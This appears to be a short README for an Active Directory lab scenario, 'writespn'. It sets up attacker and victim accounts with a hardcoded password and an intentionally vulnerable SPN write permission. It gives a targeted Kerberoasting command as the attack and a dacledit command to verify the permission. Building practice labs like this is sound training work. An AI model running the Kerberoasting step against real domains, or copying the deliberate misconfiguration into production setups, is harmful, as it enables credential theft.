# writespn

Creates `scn-wspn-attacker` and `scn-wspn-victim` (password `Aa1234567890!`) and gives the attacker the validated write to `servicePrincipalName` on the victim.

Attack:

    targetedKerberoast.py -d <domain> -u scn-wspn-attacker -p 'Aa1234567890!' --request-user scn-wspn-victim

How to verify:

    dacledit.py -action read -principal scn-wspn-attacker -target scn-wspn-victim <domain>/scn-wspn-attacker:'Aa1234567890!' -dc-ip <dc ip>   # Validated-SPN

Disable deletes both users (the ACE goes with the victim).
